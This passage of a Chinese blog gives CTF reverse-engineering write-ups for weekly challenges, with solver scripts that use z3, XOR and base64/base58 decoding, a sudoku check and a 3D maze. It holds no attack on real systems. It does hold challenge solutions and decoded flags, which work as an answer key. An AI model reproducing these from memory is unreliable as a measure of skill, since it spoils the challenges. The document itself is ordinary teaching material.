class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">50</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> des[<span class="number">45</span>] = &#123;</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0xE9</span>, <span class="number">0xC2</span>, <span class="number">0x04</span>, <span class="number">0xA4</span>, <span class="number">0xED</span>, <span class="number">0x9F</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x75</span>, <span class="number">0x3C</span>, <span class="number">0xD1</span>, <span class="number">0xCD</span>, <span class="number">0x2B</span>, <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x16</span>, <span class="number">0xEF</span>, <span class="number">0xD7</span>, <span class="number">0x27</span>, <span class="number">0x92</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x2A</span>, <span class="number">0x3C</span>, <span class="number">0xD1</span>,</span><br><span class="line">        <span class="number">0xCE</span>, <span class="number">0x03</span>, <span class="number">0xA3</span>, <span class="number">0xEF</span>, <span class="number">0xA5</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x2D</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span></span><br><span class="line">    &#125;; <span class="comment">// 密文</span></span><br><span class="line"></span><br><span class="line">    srand(<span class="number">0</span>); <span class="comment">// 设置随机种子为当前时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        key[i] = rand() % <span class="number">255</span>; <span class="comment">// 随机生成key</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line">        des[i] ^= key[i % <span class="number">10</span>]; <span class="comment">// 异或加密</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, des[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WEEK1-signin"><a href="#WEEK1-signin" class="headerlink" title="[WEEK1]signin"></a>[WEEK1]signin</h3><p>IDA打开后直接</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.zvde9hyzyog.png"></p><h3 id="WEEK1-easy-math"><a href="#WEEK1-easy-math" class="headerlink" title="[WEEK1]easy_math"></a>[WEEK1]easy_math</h3><p>直接z3约束求解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个符号变量数组l，包含6个整数变量</span></span><br><span class="line">l = [Int(<span class="string">&#x27;l%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Z3求解器</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加方程组</span></span><br><span class="line">solver.add(</span><br><span class="line">    (<span class="number">593</span> * l[<span class="number">0</span>] + <span class="number">997</span> * l[<span class="number">1</span>] + <span class="number">811</span> * l[<span class="number">2</span>] + <span class="number">258</span> * l[<span class="number">3</span>] + <span class="number">829</span> * l[<span class="number">4</span>] + <span class="number">532</span> * l[<span class="number">5</span>]) == <span class="number">0x5b8e0aef71d34ff43</span>,</span><br><span class="line">    (<span class="number">605</span> * l[<span class="number">0</span>] + <span class="number">686</span> * l[<span class="number">1</span>] + <span class="number">328</span> * l[<span class="number">2</span>] + <span class="number">602</span> * l[<span class="number">3</span>] + <span class="number">695</span> * l[<span class="number">4</span>] + <span class="number">576</span> * l[<span class="number">5</span>]) == <span class="number">0x551a262360964ef7f</span>,</span><br><span class="line">    (<span class="number">373</span> * l[<span class="number">0</span>] + <span class="number">512</span> * l[<span class="number">1</span>] + <span class="number">449</span> * l[<span class="number">2</span>] + <span class="number">756</span> * l[<span class="number">3</span>] + <span class="number">448</span> * l[<span class="number">4</span>] + <span class="number">580</span> * l[<span class="number">5</span>]) == <span class="number">0x49d158a5657d6931c</span>,</span><br><span class="line">    (<span class="number">560</span> * l[<span class="number">0</span>] + <span class="number">635</span> * l[<span class="number">1</span>] + <span class="number">422</span> * l[<span class="number">2</span>] + <span class="number">971</span> * l[<span class="number">3</span>] + <span class="number">855</span> * l[<span class="number">4</span>] + <span class="number">597</span> * l[<span class="number">5</span>]) == <span class="number">0x625568d5abbabf4f3</span>,</span><br><span class="line">    (<span class="number">717</span> * l[<span class="number">0</span>] + <span class="number">507</span> * l[<span class="number">1</span>] + <span class="number">388</span> * l[<span class="number">2</span>] + <span class="number">925</span> * l[<span class="number">3</span>] + <span class="number">324</span> * l[<span class="number">4</span>] + <span class="number">524</span> * l[<span class="number">5</span>]) == <span class="number">0x50ee0c025e70e3c23</span>,</span><br><span class="line">    (<span class="number">312</span> * l[<span class="number">0</span>] + <span class="number">368</span> * l[<span class="number">1</span>] + <span class="number">884</span> * l[<span class="number">2</span>] + <span class="number">518</span> * l[<span class="number">3</span>] + <span class="number">495</span> * l[<span class="number">4</span>] + <span class="number">414</span> * l[<span class="number">5</span>]) == <span class="number">0x40e735f8aa2815f65</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否存在解</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = [model[l[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution found:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    result[i]=<span class="built_in">hex</span>(result[i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i][<span class="number">2</span>:][j*<span class="number">2</span>:j*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="WEEK1-ez-apk"><a href="#WEEK1-ez-apk" class="headerlink" title="[WEEK1]ez_apk"></a>[WEEK1]ez_apk</h3><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1p56go1mdb0g.png"></p><p>我们分析代码，发现了加密函数，这段时一个base58的码表转换，但最后直接给了加密后的码表</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t2a0v5wtabk.webp"></p><p>我们在mainactivity中点击smail代码，找到原始数据，直接base58换表解密即可</p><p>x mappings &#x3D; { 0x04:”A”,  0x05:”B”,  0x06:”C”, 0x07:”D”, 0x08:”E”, 0x09:”F”, 0x0A:”G”,  0x0B:”H”, 0x0C:”I”,  0x0D:”J”, 0x0E:”K”, 0x0F:”L”, 0x10:”M”, 0x11:”N”,0x12:”O”,  0x13:”P”, 0x14:”Q”, 0x15:”R”, 0x16:”S”, 0x17:”T”, 0x18:”U”,0x19:”V”, 0x1A:”W”, 0x1B:”X”, 0x1C:”Y”, 0x1D:”Z”, 0x1E:”1”, 0x1F:”2”, 0x20:”3”, 0x21:”4”, 0x22:”5”,  0x23:”6”, 0x24:”7”, 0x25:”8”, 0x26:”9”, 0x27:”0”, 0x28:”\n”, 0x2a:”[DEL]”,  0X2B:”    “, 0x2C:” “,  0x2D:”-“, 0x2E:”&#x3D;”, 0x2F:”[“,  0x30:”]”,  0x31:”\“, 0x32:”~”, 0x33:”;”,  0x34:”‘“, 0x36:”,”,  0x37:”.” }nums &#x3D; []keys &#x3D; open(‘usbdata.txt’)for line in keys:    if line[0]!&#x3D;’0’ or line[1]!&#x3D;’0’ or line[3]!&#x3D;’0’ or line[4]!&#x3D;’0’ or line[9]!&#x3D;’0’ or line[10]!&#x3D;’0’ or line[12]!&#x3D;’0’ or line[13]!&#x3D;’0’ or line[15]!&#x3D;’0’ or line[16]!&#x3D;’0’ or line[18]!&#x3D;’0’ or line[19]!&#x3D;’0’ or line[21]!&#x3D;’0’ or line[22]!&#x3D;’0’:         continue    nums.append(int(line[6:8],16))keys.close()output &#x3D; “”for n in nums:    if n &#x3D;&#x3D; 0 :        continue    if n in mappings:        output +&#x3D; mappings[n]    else:        output +&#x3D; ‘[unknown]’print(‘output :\n’ + output)​# output :# SEC2ETK3YPython</p><h3 id="WEEK2-pycode"><a href="#WEEK2-pycode" class="headerlink" title="[WEEK2]pycode"></a>[WEEK2]pycode</h3><p>直接gpt将py字节码转换成普通的代码形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;*******************&#x27;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    w = <span class="number">1024</span></span><br><span class="line">    x = w % <span class="number">3</span></span><br><span class="line">    y = w // <span class="number">9</span></span><br><span class="line">    z = x * y</span><br><span class="line">    w -= z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    w = <span class="number">20</span></span><br><span class="line">    x = w % <span class="number">6</span></span><br><span class="line">    y = w // <span class="number">3</span></span><br><span class="line">    z = x * y</span><br><span class="line">    w += z</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    w = <span class="number">1024</span></span><br><span class="line">    x = w % <span class="number">3</span></span><br><span class="line">    y = w // <span class="number">9</span> </span><br><span class="line">    z = x * y</span><br><span class="line">    w -= z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    w = <span class="number">20</span></span><br><span class="line">    x = w % <span class="number">6</span></span><br><span class="line">    y = w // <span class="number">3</span></span><br><span class="line">    z = x * y </span><br><span class="line">    w += z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    temp = flag[i]</span><br><span class="line">    temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) ^ <span class="number">8</span>)</span><br><span class="line">    value += temp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    temp = value[i]</span><br><span class="line">    temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) + <span class="number">3</span>)</span><br><span class="line">    output += temp</span><br><span class="line">    </span><br><span class="line">obfuscated_output = base64.b64encode(output.encode()).decode()</span><br><span class="line">obfuscated_output = obfuscated_output[:-<span class="number">1</span>]</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(obfuscated_output)</span><br></pre></td></tr></table></figure><p>我们可以看到前面基本都是混淆的，我们只需要从后往前慢慢还原就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4&#x27;</span></span><br><span class="line"></span><br><span class="line">a=a.replace(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">a=a.replace(<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">a=a.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=a[::-<span class="number">1</span>]</span><br><span class="line">a=base64.decodebytes(a.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">a=a.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">a=<span class="built_in">list</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=(<span class="built_in">ord</span>(a[i])-<span class="number">3</span>)^<span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="WEEK2-Authur’s-box"><a href="#WEEK2-Authur’s-box" class="headerlink" title="[WEEK2]Authur’s_box"></a>[WEEK2]Authur’s_box</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0xAD</span>,<span class="number">0xA7</span>,<span class="number">0xAA</span>,<span class="number">0xAC</span>,<span class="number">0xB0</span>,<span class="number">0xF8</span>,<span class="number">0xA8</span>,<span class="number">0xFE</span>,<span class="number">0xAF</span>,<span class="number">0xFF</span>,<span class="number">0xF3</span>,<span class="number">0xA9</span>,<span class="number">0xA8</span>,<span class="number">0xE6</span>,<span class="number">0xFF</span>,<span class="number">0xFE</span>,<span class="number">0xF2</span>,<span class="number">0xFE</span>,<span class="number">0xE6</span>,<span class="number">0xFF</span>,<span class="number">0xFC</span>,<span class="number">0xF2</span>,<span class="number">0xAD</span>,<span class="number">0xE6</span>,<span class="number">0xA9</span>,<span class="number">0xFD</span>,<span class="number">0xFF</span>,<span class="number">0xF9</span>,<span class="number">0xE6</span>,<span class="number">0xA8</span>,<span class="number">0xAD</span>,<span class="number">0xA8</span>,<span class="number">0xF2</span>,<span class="number">0xA8</span>,<span class="number">0xAD</span>,<span class="number">0xFD</span>,<span class="number">0xF3</span>,<span class="number">0xAF</span>,<span class="number">0xF3</span>,<span class="number">0xAD</span>,<span class="number">0xFA</span>,<span class="number">0xB0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=a[i]^<span class="number">0xcb</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="WEEK2-签到题？"><a href="#WEEK2-签到题？" class="headerlink" title="[WEEK2]签到题？"></a>[WEEK2]签到题？</h3><p>这个题做的我有点懵逼，该说不说确实是签到</p><p>直接动调取值，取出值后直接base64解密就得出flag了</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031124243081.png" alt="image-20231031124243081"></p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031124515480.png" alt="image-20231031124515480"></p><h3 id="WEEK2-not-gcc"><a href="#WEEK2-not-gcc" class="headerlink" title="[WEEK2]not gcc"></a>[WEEK2]not gcc</h3><p><a href="https://blog.csdn.net/pc153262603/article/details/89553688">clang llc llvm 常用编译指令-CSDN博客</a></p><p><a href="https://www.cnblogs.com/ren-ctfnote/p/14948764.html">2021CISCN-逆向-baby.bc-部分知识点总结 - re0juren - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang baby.bc -o baby</span><br></pre></td></tr></table></figure><p>直接用命令把.bc文件编译成可执行文件，然后开始操作。分析代码</p><p>我们分析代码发现关键函数是sudoku函数,代码逻辑就是我们输入正确的81位数独的值，然后他把他提供的数独的值置为0，然后把未知的置为我们求出来的数独的值（有点绕）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Sudoku</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *a1;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">9</span> * i + j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">48</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">9</span> * i + j] = v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是个数独的题目，我们提取map里的值，然后去在线解数独的网站进行解密，然后我们分析上述的代码逻辑，根据他的代码逻辑对我们原本的map的值进行修改，就是最后我们要输出的答案</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031125334209.png" alt="image-20231031125334209"></p><p>那么我们直接异或就可以了，相同的值异或是0，不同的值异或0也是原本的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;407003208500020900012980004709104800061000470003270006086300040020740630304002000&quot;</span></span><br><span class="line">b=<span class="string">&quot;497513268538426917612987354759164823261839475843275196986351742125748639374692581&quot;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">   c+=<span class="built_in">str</span>(<span class="built_in">int</span>(a[i])^<span class="built_in">int</span>(b[i]))</span><br><span class="line">  <span class="comment">#  print(int(a[i])^int(b[i]),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># 090510060038406017600007350050060023200839005840005190900051702105008009070690581</span></span><br><span class="line">d=hashlib.md5()</span><br><span class="line">d.update(<span class="string">b&#x27;090510060038406017600007350050060023200839005840005190900051702105008009070690581&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d.hexdigest())</span><br></pre></td></tr></table></figure><h3 id="WEEK2-Run-润！"><a href="#WEEK2-Run-润！" class="headerlink" title="[WEEK2]Run?润！"></a>[WEEK2]Run?润！</h3><p>迷宫题目，学习了一下数据结构中的DFS和BFS算法，提供地图一键解出路径，学习了如何调试出地图</p><p><a href="https://mp.weixin.qq.com/s/T6ML7zwA57JXTRwOZqcxhw?spm=a2c6h.12873639.article-detail.7.19f31041PU5YhX">微信公众平台 (qq.com)</a></p><p><a href="https://blog.csdn.net/Sciurdae/article/details/133963882">CTF-Reverse 迷宫地图类题目分析‘‘DFS和BFS算法‘‘（学习笔记）【详】-CSDN博客</a></p><p><a href="https://blog.csdn.net/Sciurdae/article/details/133964592">SHCTF2023 山河CTF Reverse方向week2全WP【详解】-CSDN博客</a></p><p>分析代码，我们看到sub_401A26();就是我们的地图生成函数，我们看到他的调用情况，最一开始调用了一次，然后后续的走迷宫的过程中又生成了一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">sub_401A26</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v5++;</span><br><span class="line">      v1 = v0;</span><br><span class="line">      result = dword_408060;</span><br><span class="line">      dword_408060[v1] = (dword_404020[<span class="number">2</span> * dword_408040 + i] &gt;&gt; j) &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031181941311.png" alt="image-20231031181941311"></p><p>v8 &#x3D; sub_401AAF(v8, Str[i]);是我们的主函数，我们分析其中的代码可以分析出这是3维迷宫,u和q就是控制的三维迷宫的xyz中的x（层），他们使用一次是加减64，同时dword_408040记录的就是我们当初的层数，可以看到调用u和q的时候他会加减变化，初始值为0，w和s是控制的xyz中的y，就是每层的行数，a和d就是控制的z，每一数据具体的列数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401AAF</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">64</span>;</span><br><span 